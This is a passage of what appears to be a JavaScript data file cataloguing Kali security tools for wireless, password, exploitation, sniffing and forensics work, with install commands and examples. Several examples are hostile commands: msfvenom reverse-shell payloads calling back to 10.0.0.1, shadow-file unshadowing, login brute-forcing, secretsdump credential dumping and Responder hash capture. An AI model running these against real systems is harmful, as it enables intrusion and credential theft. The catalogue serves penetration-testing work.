    dangerLevel: 'high', command: 'pixiewps',
    installCmd: 'sudo apt install pixiewps',
    offline: true,
    args: [
      { name: 'options', flag: '', description: 'Requires captured PKE, PKR, E-Hash, E-Nonce', required: true, example: '--pke=... --pk=... --ehash=... --enonce=...', type: 'text' },
    ],
    examples: ['pixiewps -e <EHASH> -r <ERHASH> -s <ENONCE> -a <APAUTHKEY> -n <APNONCE>'],
    notes: 'Works against WPS routers with weak random number generators.',
    tags: ['wps', 'pixie-dust', 'offline-attack'],
  },
  {
    id: 'airgeddon', name: 'Airgeddon', category: 'wireless', source: 'kali',
    description: 'Multi-use bash script for WiFi auditing. Auto-detects and attacks wireless networks.',
    dangerLevel: 'high', command: 'airgeddon.sh',
    installCmd: 'git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git',
    offline: true,
    args: [
      { name: 'interface', flag: '', description: 'Interactive menu, select interface', required: false, example: 'wlan0', type: 'text' },
    ],
    examples: ['sudo bash airgeddon.sh'],
    notes: 'Interactive menu-driven tool. Auto-handles monitor mode, deauth, WPA handshakes, PMKID.',
    tags: ['wifi', 'automated', 'menu-driven'],
  },
  {
    id: 'hcxdumptool', name: 'hcxdumptool', category: 'wireless', source: 'kali',
    description: 'Captures packets from WLAN devices. Optimized for PMKID and WPA handshake capture.',
    dangerLevel: 'high', command: 'hcxdumptool',
    installCmd: 'sudo apt install hcxdumptool hcxtools',
    offline: true,
    args: [
      { name: 'interface', flag: '-i', description: 'Wireless interface', required: true, example: 'wlan0mon', type: 'text' },
    ],
    examples: ['sudo hcxdumptool -i wlan0mon -w capture.pcapng', 'sudo hcxdumptool -i wlan0mon --enable_status=1'],
    tags: ['pmkid', 'handshake-capture', 'wpa'],
  },
  {
    id: 'hcxtools', name: 'hcxtools', category: 'wireless', source: 'kali',
    description: 'Convert and analyze pcap files for hashcat. PMKID to hashcat conversion.',
    dangerLevel: 'medium', command: 'hcxpcapngtool',
    installCmd: 'sudo apt install hcxtools',
    offline: true,
    args: [
      { name: 'input', flag: '', description: 'Input pcapng file', required: true, example: 'capture.pcapng', type: 'text' },
    ],
    examples: ['hcxpcapngtool -o hash.hc22000 capture.pcapng'],
    notes: 'Converts captured data to hashcat format (22000) for GPU cracking.',
    tags: ['hashcat', 'conversion', 'wpa'],
  },
  {
    id: 'macchanger', name: 'MAC Changer', category: 'wireless', source: 'kali',
    description: 'MAC address spoofing utility. Randomize or set specific MAC addresses.',
    dangerLevel: 'medium', command: 'macchanger',
    installCmd: 'sudo apt install macchanger',
    offline: true,
    args: [
      { name: 'interface', flag: '', description: 'Network interface', required: true, example: 'wlan0', type: 'text' },
      { name: 'mode', flag: '-r', description: 'Random MAC (-r) or specific (-m)', required: false, example: '', type: 'select', options: ['-r (Random)', '-m XX:XX:XX:XX:XX:XX (Specific)', '-a (Same vendor)', '-A (Auto)', '-p (Permanent)'] },
    ],
    examples: ['sudo macchanger -r wlan0', 'sudo macchanger -m 00:11:22:33:44:55 wlan0', 'sudo macchanger -a wlan0'],
    tags: ['anonymity', 'spoofing'],
  },
  {
    id: 'bully', name: 'Bully', category: 'wireless', source: 'kali',
    description: 'WPS brute force attack tool. Alternative to Reaver with different approach.',
    dangerLevel: 'high', command: 'bully',
    installCmd: 'sudo apt install bully',
    offline: true,
    args: [
      { name: 'interface', flag: '-c', description: 'Wireless interface', required: true, example: 'wlan0mon', type: 'text' },
      { name: 'bssid', flag: '-b', description: 'Target BSSID', required: true, example: 'AA:BB:CC:DD:EE:FF', type: 'text' },
    ],
    examples: ['sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF'],
    tags: ['wps', 'brute-force'],
  },
  {
    id: 'bettercap', name: 'Bettercap', category: 'wireless', source: 'kali',
    description: 'Swiss army knife for network attacks. WiFi, BLE, Ethernet MITM, and recon.',
    dangerLevel: 'high', command: 'bettercap',
    installCmd: 'sudo apt install bettercap',
    offline: true,
    args: [
      { name: 'interface', flag: '-I', description: 'Network interface', required: false, example: 'wlan0', type: 'text' },
    ],
    examples: ['sudo bettercap -I wlan0', 'sudo bettercap -iface eth0 -caplet http-ui'],
    notes: 'Full attack framework. Interactive session with modules for WiFi, BLE, proxy, spoofing.',
    tags: ['framework', 'mitm', 'wifi', 'ble'],
  },

  // ═══════════════════════════════════════════
  // PASSWORD (10 tools)
  // ═══════════════════════════════════════════
  {
    id: 'john', name: 'John the Ripper', category: 'password', source: 'kali',
    description: 'Fast password cracker supporting 100+ hash types. CPU-based cracking.',
    dangerLevel: 'medium', command: 'john',
    installCmd: 'sudo apt install john',
    offline: true,
    args: [
      { name: 'hashfile', flag: '', description: 'File containing hashes', required: true, example: 'hashes.txt', type: 'text' },
      { name: 'wordlist', flag: '--wordlist', description: 'Wordlist path', required: false, example: '/usr/share/wordlists/rockyou.txt', type: 'text' },
      { name: 'format', flag: '--format', description: 'Hash type', required: false, example: 'md5', type: 'text' },
    ],
    examples: ['john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt', 'john --format=md5 hashes.txt --show', 'unshadow /etc/passwd /etc/shadow > unshadowed.txt && john unshadowed.txt'],
    tags: ['hash-cracking', 'essential'],
  },
  {
    id: 'hashcat', name: 'Hashcat', category: 'password', source: 'kali',
    description: 'World\'s fastest password recovery. GPU-accelerated with 300+ hash modes.',
    dangerLevel: 'medium', command: 'hashcat',
    installCmd: 'sudo apt install hashcat',
    offline: true,
    args: [
      { name: 'hashfile', flag: '', description: 'File containing hashes', required: true, example: 'hash.txt', type: 'text' },
      { name: 'mode', flag: '-m', description: 'Hash type mode number', required: false, example: '0', type: 'select', options: ['0 (MD5)', '100 (SHA-1)', '1400 (SHA-256)', '1800 (SHA-512)', '1000 (NTLM)', '22000 (WPA-PKID)', '2500 (WPA2)'] },
      { name: 'attack', flag: '-a', description: 'Attack mode', required: false, example: '0', type: 'select', options: ['0 (Straight/Wordlist)', '1 (Combination)', '3 (Brute Force)', '6 (Hybrid Wordlist+Mask)'] },
      { name: 'wordlist', flag: '', description: 'Wordlist (for mode 0)', required: false, example: '/usr/share/wordlists/rockyou.txt', type: 'text' },
    ],
    examples: ['hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt', 'hashcat -m 2500 -a 0 capture.hccapx wordlist.txt', 'hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a'],
    tags: ['gpu-cracking', 'fast', 'essential'],
  },
  {
    id: 'hydra', name: 'Hydra', category: 'password', source: 'kali',
    description: 'Fast and flexible online login password cracking tool. 50+ protocols.',
    dangerLevel: 'high', command: 'hydra',
    installCmd: 'sudo apt install hydra',
    offline: true,
    args: [
      { name: 'target', flag: '', description: 'Target host', required: true, example: '192.168.1.100', type: 'text' },
      { name: 'service', flag: '-s', description: 'Service and port', required: true, example: 'ssh -l admin -P wordlist.txt', type: 'text' },
      { name: 'wordlist', flag: '-P', description: 'Password wordlist', required: false, example: '/usr/share/wordlists/rockyou.txt', type: 'text' },
    ],
    examples: ['hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh', 'hydra -L users.txt -P pass.txt 192.168.1.100 ftp', 'hydra -l admin -P pass.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:Failed"'],
    tags: ['brute-force', 'online-cracking', 'essential'],
  },
  {
    id: 'medusa', name: 'Medusa', category: 'password', source: 'kali',
    description: 'Parallel, modular brute-force login attacker. Similar to Hydra with different approach.',
    dangerLevel: 'high', command: 'medusa',
    installCmd: 'sudo apt install medusa',
    offline: true,
    args: [
      { name: 'target', flag: '-h', description: 'Target host', required: true, example: '192.168.1.100', type: 'text' },
      { name: 'user', flag: '-u', description: 'Username', required: true, example: 'admin', type: 'text' },
      { name: 'wordlist', flag: '-P', description: 'Password file', required: false, example: '/usr/share/wordlists/rockyou.txt', type: 'text' },
    ],
    examples: ['medusa -h 192.168.1.100 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh', 'medusa -h 192.168.1.100 -U users.txt -P pass.txt -M smb'],
    tags: ['brute-force', 'parallel'],
  },
  {
    id: 'crunch', name: 'Crunch', category: 'password', source: 'kali',
    description: 'Wordlist generator. Creates custom wordlists based on character patterns.',
    dangerLevel: 'info', command: 'crunch',
    installCmd: 'sudo apt install crunch',
    offline: true,
    args: [
      { name: 'min', flag: '', description: 'Minimum length', required: true, example: '4', type: 'number' },
      { name: 'max', flag: '', description: 'Maximum length', required: true, example: '8', type: 'number' },
      { name: 'charset', flag: '', description: 'Character set', required: false, example: 'abcdef0123456789', type: 'text' },
    ],
    examples: ['crunch 4 8 abcdef0123456789 > wordlist.txt', 'crunch 6 6 0123456789 -t @@@@^^ | hydra -l admin -P - 192.168.1.100 ssh'],
    tags: ['wordlist-generator', 'brute-force'],
  },
  {
    id: 'cewl', name: 'CeWL', category: 'password', source: 'kali',
    description: 'Custom wordlist generator. Spiders a website to build wordlists from page content.',
    dangerLevel: 'low', command: 'cewl',
    installCmd: 'sudo apt install cewl',
    offline: false,
    args: [
      { name: 'url', flag: '', description: 'Target URL to spider', required: true, example: 'http://example.com', type: 'text' },
      { name: 'depth', flag: '-d', description: 'Spider depth', required: false, example: '2', type: 'number' },
      { name: 'min_length', flag: '-m', description: 'Minimum word length', required: false, example: '6', type: 'number' },
    ],
    examples: ['cewl http://example.com -d 2 -m 6 -w wordlist.txt'],
    tags: ['wordlist-generator', 'spider'],
  },
  {
    id: 'hashid', name: 'Hash-Identifier', category: 'password', source: 'kali',
    description: 'Identifies hash types. Tells you which algorithm was used to generate a hash.',
    dangerLevel: 'info', command: 'hashid',
    installCmd: 'sudo apt install hashid || pip3 install hashid',
    offline: true,
    args: [
      { name: 'hash', flag: '', description: 'Hash string to identify', required: true, example: '5d41402abc4b2a76b9719d911017c592', type: 'text' },
    ],
    examples: ['hashid 5d41402abc4b2a76b9719d911017c592', 'hashid e10adc3949ba59abbe56e057f20f883e'],
    tags: ['hash-identify', 'analysis'],
  },
  {
    id: 'patator', name: 'Patator', category: 'password', source: 'kali',
    description: 'Multi-purpose brute-force tool with modular plugin system.',
    dangerLevel: 'high', command: 'patator',
    installCmd: 'sudo apt install patator || pip3 install patator',
    offline: true,
    args: [
      { name: 'module', flag: '', description: 'Module to use', required: true, example: 'ssh_login', type: 'select', options: ['ssh_login', 'ftp_login', 'smtp_login', 'pop3_login', 'imap_login', 'smb_login', 'vnc_login', 'http_fuzz'] },
      { name: 'host', flag: 'host=', description: 'Target host', required: true, example: '192.168.1.100', type: 'text' },
    ],
    examples: ['patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=pass.txt'],
    tags: ['brute-force', 'modular'],
  },
  {
    id: 'seclists', name: 'SecLists', category: 'password', source: 'custom',
    description: 'Collection of multiple types of lists for security assessments. Wordlists, payloads, patterns.',
    dangerLevel: 'info', command: 'ls',
    installCmd: 'sudo apt install seclists || git clone https://github.com/danielmiessler/SecLists /usr/share/seclists',
    offline: true,
    args: [
      { name: 'path', flag: '', description: 'SecLists directory', required: false, example: '/usr/share/seclists', type: 'text' },
    ],
    examples: ['ls /usr/share/seclists/Discovery/Web-Content/', 'ls /usr/share/seclists/Passwords/'],
    notes: 'Not a tool itself, but a massive collection of wordlists and payloads used by many other tools.',
    tags: ['wordlists', 'payloads', 'essential-resource'],
  },
  {
    id: 'wordlists', name: 'RockYou Wordlist', category: 'password', source: 'kali',
    description: 'The most popular password wordlist. 14 million+ real leaked passwords.',
    dangerLevel: 'info', command: 'file',
    installCmd: 'sudo apt install wordlists || wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt',
    offline: true,
    args: [
      { name: 'path', flag: '', description: 'Wordlist location', required: false, example: '/usr/share/wordlists/rockyou.txt', type: 'text' },
    ],
    examples: ['gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null; wc -l /usr/share/wordlists/rockyou.txt'],
    notes: 'Often comes compressed. Decompress first: sudo gunzip /usr/share/wordlists/rockyou.txt.gz',
    tags: ['wordlist', 'essential-resource'],
  },

  // ═══════════════════════════════════════════
  // EXPLOITATION (10 tools)
  // ═══════════════════════════════════════════
  {
    id: 'metasploit', name: 'Metasploit Framework', category: 'exploitation', source: 'kali',
    description: 'The most advanced penetration testing framework. 2000+ exploits, 1000+ payloads.',
    dangerLevel: 'critical', command: 'msfconsole',
    installCmd: 'sudo apt install metasploit-framework',
    offline: true,
    args: [
      { name: 'mode', flag: '', description: 'Launch mode', required: false, example: '', type: 'select', options: ['msfconsole (Interactive)', 'msfvenom (Payload Gen)', 'msfdb (Database Init)'] },
    ],
    examples: ['sudo msfconsole', 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf', 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > payload.exe'],
    notes: 'Massive framework. Initialize DB first: sudo msfdb init. Full interactive console with search, use, set, exploit commands.',
    tags: ['framework', 'essential', 'exploits'],
  },
  {
    id: 'searchsploit', name: 'SearchSploit', category: 'exploitation', source: 'kali',
    description: 'Exploit-DB command-line search tool. Find public exploits for software versions.',
    dangerLevel: 'medium', command: 'searchsploit',
    installCmd: 'sudo apt install exploitdb',
    offline: true,
    args: [
      { name: 'query', flag: '', description: 'Search term (software, CVE, platform)', required: true, example: 'apache 2.4', type: 'text' },
    ],
    examples: ['searchsploit apache 2.4', 'searchsploit -x 12345  # Copy exploit to current dir', 'searchsploit -m 12345.py  # Mirror exploit'],
    tags: ['exploit-db', 'search', 'essential'],
  },
  {
    id: 'msfvenom', name: 'MSFVenom', category: 'exploitation', source: 'kali',
    description: 'Metasploit payload generator. Creates custom backdoors and payloads for any platform.',
    dangerLevel: 'critical', command: 'msfvenom',
    installCmd: 'sudo apt install metasploit-framework',
    offline: true,
    args: [
      { name: 'payload', flag: '-p', description: 'Payload type', required: true, example: 'linux/x64/meterpreter/reverse_tcp', type: 'text' },
      { name: 'lhost', flag: 'LHOST', description: 'Listener IP', required: true, example: '10.0.0.1', type: 'text' },
      { name: 'lport', flag: 'LPORT', description: 'Listener port', required: true, example: '4444', type: 'number' },
      { name: 'format', flag: '-f', description: 'Output format', required: true, example: 'elf', type: 'select', options: ['elf (Linux)', 'exe (Windows)', 'macho (macOS)', 'php', 'python', 'jsp', 'war', 'apk', 'dll'] },
    ],
    examples: ['msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf', 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o backdoor.exe'],
    tags: ['payload', 'backdoor', 'essential'],
  },
  {
    id: 'crackmapexec', name: 'CrackMapExec', category: 'exploitation', source: 'kali',
    description: 'Post-exploitation tool for Windows/AD environments. SMB, WinRM, LDAP, MSSQL.',
    dangerLevel: 'high', command: 'crackmapexec',
    installCmd: 'pip3 install crackmapexec || sudo apt install crackmapexec',
    offline: true,
    args: [
      { name: 'target', flag: '', description: 'Target IP/CIDR', required: true, example: '192.168.1.0/24', type: 'text' },
      { name: 'protocol', flag: '', description: 'Protocol', required: true, example: 'smb', type: 'select', options: ['smb', 'winrm', 'ldap', 'mssql', 'ssh', 'rdp'] },
      { name: 'credentials', flag: '-u/-p', description: 'Username:Password', required: false, example: 'admin:password123', type: 'text' },
    ],
    examples: ['crackmapexec smb 192.168.1.0/24 -u admin -p password123', 'crackmapexec smb 192.168.1.100 --shares', 'crackmapexec smb 192.168.1.0/24 --users'],
    tags: ['post-exploitation', 'ad', 'smb'],
  },
  {
    id: 'evil-winrm', name: 'Evil-WinRM', category: 'exploitation', source: 'kali',
    description: 'Ultimate WinRM shell for penetration testing. File upload/download, command execution.',
    dangerLevel: 'high', command: 'evil-winrm',
    installCmd: 'gem install evil-winrm || sudo apt install evil-winrm',
    offline: true,
    args: [
      { name: 'ip', flag: '-i', description: 'Target IP', required: true, example: '192.168.1.100', type: 'text' },
      { name: 'user', flag: '-u', description: 'Username', required: true, example: 'admin', type: 'text' },
      { name: 'pass', flag: '-p', description: 'Password', required: true, example: 'password123', type: 'text' },
    ],
    examples: ['evil-winrm -i 192.168.1.100 -u admin -p password123', 'evil-winrm -i 192.168.1.100 -u admin -H NTLM_HASH'],
    tags: ['winrm', 'shell', 'windows'],
  },
  {
    id: 'impacket', name: 'Impacket', category: 'exploitation', source: 'kali',
    description: 'Collection of Python classes for working with network protocols. SMB, Kerberos, LDAP.',
    dangerLevel: 'high', command: 'impacket-',
    installCmd: 'pip3 install impacket || sudo apt install impacket-scripts',
    offline: true,
    args: [
      { name: 'script', flag: '', description: 'Impacket script to run', required: true, example: 'psexec.py', type: 'select', options: ['psexec.py', 'wmiexec.py', 'smbexec.py', 'atexec.py', 'secretsdump.py', 'samrdump.py', 'getTGT.py', 'getST.py'] },
    ],
    examples: ['impacket-psexec admin:password@192.168.1.100', 'impacket-secretsdump admin:password@192.168.1.100', 'impacket-getTGT domain.com/user:password'],
    tags: ['windows', 'ad', 'python', 'essential'],
  },
  {
    id: 'ligolo', name: 'Ligolo-ng', category: 'exploitation', source: 'kali',
    description: 'Tunneling and pivoting tool using TUN interfaces. Bypass network restrictions.',
    dangerLevel: 'high', command: 'ligolo-proxy',
    installCmd: 'go install github.com/nicocha30/ligolo-ng/cmd/agent@latest && go install github.com/nicocha30/ligolo-ng/cmd/proxy@latest',
    offline: true,
    args: [
      { name: 'interface', flag: '', description: 'Start proxy, then connect agents', required: false, example: '', type: 'text' },
    ],
    examples: ['sudo ligolo-proxy', 'CONNECT 10.0.0.1:11601  # In proxy console'],
    notes: 'Agent must be deployed on target first. Proxy creates TUN interface for tunneling.',
    tags: ['tunneling', 'pivoting'],
  },
  {
    id: 'chisel', name: 'Chisel', category: 'exploitation', source: 'kali',
    description: 'Fast TCP/UDP tunnel over HTTP. Written in Go. Reverse and SOCKS proxy tunnels.',
    dangerLevel: 'high', command: 'chisel',
    installCmd: 'go install github.com/jpillora/chisel@latest',
    offline: true,
    args: [
      { name: 'mode', flag: '', description: 'Server or client mode', required: true, example: 'server', type: 'select', options: ['server', 'client'] },
      { name: 'target', flag: '', description: 'Target and tunnel spec', required: true, example: '--reverse -p 8080 R:socks', type: 'text' },
    ],
    examples: ['./chisel server -p 8080 --reverse', './chisel client http://10.0.0.1:8080 R:socks'],
    tags: ['tunneling', 'socks', 'go'],
  },
  {
    id: 'linux-exploit-suggester', name: 'Linux Exploit Suggester', category: 'exploitation', source: 'custom',
    description: 'Suggests kernel exploits based on kernel version and distro.',
    dangerLevel: 'medium', command: 'linux-exploit-suggester.sh',
    installCmd: 'wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh && chmod +x linux-exploit-suggester.sh',
    offline: true,
    args: [
      { name: 'kernel', flag: '--kver', description: 'Kernel version string', required: false, example: '5.4.0', type: 'text' },
    ],
    examples: ['./linux-exploit-suggester.sh', './linux-exploit-suggester.sh --kver 5.4.0-42-generic', 'uname -r | ./linux-exploit-suggester.sh --kver $(cat)'],
    tags: ['privesc', 'kernel', 'suggestion'],
  },
  {
    id: 'linpeas', name: 'LinPEAS', category: 'exploitation', source: 'custom',
    description: 'Linux Privilege Escalation Awesome Script. Enumerates all possible privesc vectors.',
    dangerLevel: 'medium', command: 'linpeas.sh',
    installCmd: 'wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh',
    offline: true,
    args: [
      { name: 'quiet', flag: '-q', description: 'Quiet mode (less output)', required: false, example: '', type: 'text' },
    ],
    examples: ['./linpeas.sh', './linpeas.sh -q | tee linpeas_output.txt'],
    tags: ['privesc', 'enumeration', 'essential'],
  },

  // ═══════════════════════════════════════════
  // SNIFFING (8 tools)
  // ═══════════════════════════════════════════
  {
    id: 'tshark', name: 'TShark', category: 'sniffing', source: 'kali',
    description: 'Terminal-based network protocol analyzer. CLI version of Wireshark.',
    dangerLevel: 'medium', command: 'tshark',
    installCmd: 'sudo apt install tshark',
    offline: true,
    args: [
      { name: 'interface', flag: '-i', description: 'Interface to capture on', required: true, example: 'eth0', type: 'text' },
      { name: 'filter', flag: '', description: 'BPF or display filter', required: false, example: 'port 80', type: 'text' },
    ],
    examples: ['sudo tshark -i eth0 port 80', 'sudo tshark -i eth0 -w capture.pcap', 'tshark -r capture.pcap -Y "http.request"'],
    tags: ['packet-capture', 'wireshark-cli'],
  },
  {
    id: 'tcpdump', name: 'TCPDump', category: 'sniffing', source: 'kali',
    description: 'Packet analyzer. Classic command-line tool for capturing and inspecting network traffic.',
    dangerLevel: 'medium', command: 'tcpdump',
    installCmd: 'sudo apt install tcpdump',
    offline: true,
    args: [
      { name: 'interface', flag: '-i', description: 'Interface', required: true, example: 'eth0', type: 'text' },
      { name: 'filter', flag: '', description: 'BPF filter expression', required: false, example: 'port 22 or host 192.168.1.1', type: 'text' },
      { name: 'output', flag: '-w', description: 'Write to pcap file', required: false, example: 'capture.pcap', type: 'text' },
    ],
    examples: ['sudo tcpdump -i eth0 port 80', 'sudo tcpdump -i eth0 -w capture.pcap', 'sudo tcpdump -i eth0 -A -s 0 port 80'],
    tags: ['packet-capture', 'essential'],
  },
  {
    id: 'mitmproxy', name: 'MITMProxy', category: 'sniffing', source: 'kali',
    description: 'Interactive HTTPS proxy for intercepting and modifying traffic.',
    dangerLevel: 'high', command: 'mitmproxy',
    installCmd: 'pip3 install mitmproxy || sudo apt install mitmproxy',
    offline: true,
    args: [
      { name: 'mode', flag: '', description: 'Run mode', required: false, example: '', type: 'select', options: ['mitmproxy (Interactive)', 'mitmdump (Stdout)', 'mitmweb (Web UI)'] },
    ],
    examples: ['mitmproxy', 'mitmweb --web-host 0.0.0.0 --web-port 8081', 'mitmdump -w traffic.flow'],
    tags: ['proxy', 'https', 'intercept'],
  },
  {
    id: 'ettercap', name: 'Ettercap', category: 'sniffing', source: 'kali',
    description: 'Comprehensive suite for MITM attacks. ARP spoofing, DNS spoofing, session hijacking.',
    dangerLevel: 'high', command: 'ettercap',
    installCmd: 'sudo apt install ettercap-graphical',
    offline: true,
    args: [
      { name: 'mode', flag: '', description: 'Mode', required: false, example: '-T', type: 'select', options: ['-T (Text mode)', '-G (GUI mode)', '-C (Curses mode)'] },
    ],
    examples: ['sudo ettercap -T -M arp:remote /192.168.1.100// /192.168.1.1//', 'sudo ettercap -T -q -i eth0 -M arp:remote /gateway// /target//'],
    tags: ['mitm', 'arp-spoof', 'classic'],
  },
  {
    id: 'responder', name: 'Responder', category: 'sniffing', source: 'kali',
    description: 'LLMNR, NBT-NS, and MDNS poisoner. Captures NTLM hashes on the network.',
    dangerLevel: 'high', command: 'responder',
    installCmd: 'pip3 install responder || sudo apt install responder',
    offline: true,
    args: [
      { name: 'interface', flag: '-I', description: 'Network interface', required: true, example: 'eth0', type: 'text' },
    ],
    examples: ['sudo responder -I eth0 -wrf', 'sudo responder -I eth0 -A  # Analyze mode only'],
    tags: ['ntlm-capture', 'poisoning', 'credential-theft'],
  },
  {
    id: 'wireshark', name: 'Wireshark (tshark)', category: 'sniffing', source: 'kali',
    description: 'The world\'s foremost network protocol analyzer. Use tshark for CLI, wireshark for GUI.',
    dangerLevel: 'medium', command: 'wireshark',
    installCmd: 'sudo apt install wireshark tshark',
    offline: true,
    args: [
      { name: 'capture', flag: '', description: 'Launch GUI or use tshark for CLI', required: false, example: '', type: 'text' },
    ],
    examples: ['sudo wireshark  # GUI', 'tshark -r capture.pcap -Y dns  # CLI analysis'],
    notes: 'For headless/SSH use tshark. Wireshark GUI for desktop environments.',
    tags: ['packet-analysis', 'essential', 'gui'],
  },
  {
    id: 'netsniff-ng', name: 'NetSniff-NG', category: 'sniffing', source: 'kali',
    description: 'High-performance Linux network sniffer. Zero-copy packet capture.',
    dangerLevel: 'medium', command: 'netsniff-ng',
    installCmd: 'sudo apt install netsniff-ng',
    offline: true,
    args: [
      { name: 'interface', flag: '-i', description: 'Interface', required: true, example: 'eth0', type: 'text' },
    ],
    examples: ['sudo netsniff-ng -i eth0 -O pcap_file.pcap', 'sudo netsniff-ng -i eth0 -T -B'],
    tags: ['high-performance', 'packet-capture'],
  },
  {
    id: 'dsniff', name: 'DSniff Suite', category: 'sniffing', source: 'kali',
    description: 'Collection of sniffing tools: urlsnarf, mailsnarf, filesnarf, webspy, sshmitm.',
    dangerLevel: 'high', command: 'urlsnarf',
    installCmd: 'sudo apt install dsniff',
    offline: true,
    args: [
      { name: 'interface', flag: '-i', description: 'Interface', required: true, example: 'eth0', type: 'text' },
    ],
    examples: ['sudo urlsnarf -i eth0', 'sudo mailsnarf -i eth0', 'sudo filesnarf -i eth0', 'sudo webspy -i eth0 target'],
    notes: 'Suite includes: dsniff, filesnarf, mailsnarf, msgsnarf, urlsnarf, webspy, arpspoof, macof.',
    tags: ['sniffing-suite', 'url-capture', 'email-capture'],
  },

  // ═══════════════════════════════════════════
  // FORENSICS (10 tools)
  // ═══════════════════════════════════════════
  {
    id: 'binwalk', name: 'Binwalk', category: 'forensics', source: 'kali',
    description: 'Firmware analysis tool. Extracts embedded files and executable code from binaries.',
    dangerLevel: 'info', command: 'binwalk',
    installCmd: 'sudo apt install binwalk',
    offline: true,
    args: [
      { name: 'file', flag: '', description: 'File to analyze', required: true, example: 'firmware.bin', type: 'text' },
    ],
    examples: ['binwalk firmware.bin', 'binwalk -e firmware.bin  # Extract files', 'binwalk --dd=".*" firmware.bin'],
    tags: ['firmware', 'extraction', 'essential'],
  },
  {
    id: 'volatility', name: 'Volatility3', category: 'forensics', source: 'kali',
    description: 'Memory forensics framework. Analyzes RAM dumps for processes, network connections, malware.',
    dangerLevel: 'medium', command: 'vol',
    installCmd: 'pip3 install volatility3 || git clone https://github.com/volatilityfoundation/volatility3',
    offline: true,
    args: [
      { name: 'profile', flag: '', description: 'Memory dump file', required: true, example: 'memory.dmp', type: 'text' },
      { name: 'plugin', flag: '', description: 'Plugin to run', required: false, example: 'windows.pslist', type: 'select', options: ['windows.pslist', 'windows.pstree', 'windows.netstat', 'windows.hashdump', 'linux.pslist', 'linux.bash', 'windows.malfind'] },
    ],
    examples: ['vol -f memory.dmp windows.pslist', 'vol -f memory.dmp windows.hashdump', 'vol -f memory.dmp windows.malfind'],
    tags: ['memory-forensics', 'ram-analysis', 'essential'],
  },
  {
    id: 'sleuthkit', name: 'The Sleuth Kit', category: 'forensics', source: 'kali',
    description: 'Toolkit for disk forensics. File system analysis, timeline creation, disk imaging.',
    dangerLevel: 'medium', command: 'fls',
    installCmd: 'sudo apt install sleuthkit',
    offline: true,
    args: [
      { name: 'image', flag: '', description: 'Disk image', required: true, example: 'disk.img', type: 'text' },
      { name: 'partition', flag: '-o', description: 'Partition offset', required: false, example: '2048', type: 'number' },
    ],
    examples: ['fls -r -o 2048 disk.img', 'mmls disk.img', 'icat -o 2048 disk.img 12345  # Extract file'],
    notes: 'Suite: fls (file listing), icat (file extraction), mmls (partition table), ils (inode listing), fsstat.',
    tags: ['disk-forensics', 'filesystem', 'essential'],
  },
  {
    id: 'bulk_extractor', name: 'Bulk Extractor', category: 'forensics', source: 'kali',
    description: 'Extracts useful information (emails, URLs, credit cards, keys) from disk images.',
    dangerLevel: 'info', command: 'bulk_extractor',
    installCmd: 'sudo apt install bulk-extractor',
    offline: true,
    args: [
      { name: 'image', flag: '-o', description: 'Output directory', required: true, example: '/tmp/output', type: 'text' },
      { name: 'input', flag: '', description: 'Disk image or directory', required: true, example: 'disk.img', type: 'text' },
    ],
    examples: ['bulk_extractor -o /tmp/output disk.img'],
    tags: ['data-extraction', 'regex', 'forensics'],
  },
  {
    id: 'foremost', name: 'Foremost', category: 'forensics', source: 'kali',
    description: 'File recovery tool based on file header signatures. Recovers deleted files.',
    dangerLevel: 'info', command: 'foremost',
    installCmd: 'sudo apt install foremost',
    offline: true,
    args: [
      { name: 'input', flag: '-i', description: 'Input file/disk image', required: true, example: 'disk.img', type: 'text' },
      { name: 'output', flag: '-o', description: 'Output directory', required: false, example: '/tmp/recovered', type: 'text' },
    ],
    examples: ['sudo foremost -i disk.img -o /tmp/recovered', 'sudo foremost -t all -i /dev/sdb1 -o /tmp/recovered'],
    tags: ['file-recovery', 'deleted-files'],
  },
  {
    id: 'scalpel', name: 'Scalpel', category: 'forensics', source: 'kali',
    description: 'Carve files from disk images based on header/footer signatures. Improved foremost.',
    dangerLevel: 'info', command: 'scalpel',
    installCmd: 'sudo apt install scalpel',
    offline: true,
    args: [
      { name: 'config', flag: '-c', description: 'Config file', required: false, example: '/etc/scalpel/scalpel.conf', type: 'text' },
      { name: 'input', flag: '', description: 'Input image', required: true, example: 'disk.img', type: 'text' },
      { name: 'output', flag: '-o', description: 'Output directory', required: false, example: '/tmp/carved', type: 'text' },
    ],
    examples: ['scalpel disk.img -o /tmp/carved'],
    tags: ['file-carving', 'recovery'],
  },
  {
    id: 'autopsy', name: 'Autopsy', category: 'forensics', source: 'kali',
    description: 'Digital forensics platform with web interface. Built on Sleuth Kit.',
    dangerLevel: 'medium', command: 'autopsy',
    installCmd: 'sudo apt install autopsy',
    offline: true,
    args: [
      { name: 'target', flag: '', description: 'Launch web UI', required: false, example: '', type: 'text' },
    ],
    examples: ['autopsy  # Opens web UI on port 9999'],
    notes: 'Web-based GUI for disk forensics. Analyze disk images, extract files, create timelines.',
    tags: ['forensics-platform', 'gui', 'web-ui'],
  },
  {
    id: 'extundelete', name: 'ExtUndelete', category: 'forensics', source: 'kali',
    description: 'Recover deleted files from ext3/ext4 filesystems.',
    dangerLevel: 'info', command: 'extundelete',
    installCmd: 'sudo apt install extundelete',
    offline: true,
    args: [
      { name: 'device', flag: '', description: 'Device or image file', required: true, example: '/dev/sdb1', type: 'text' },
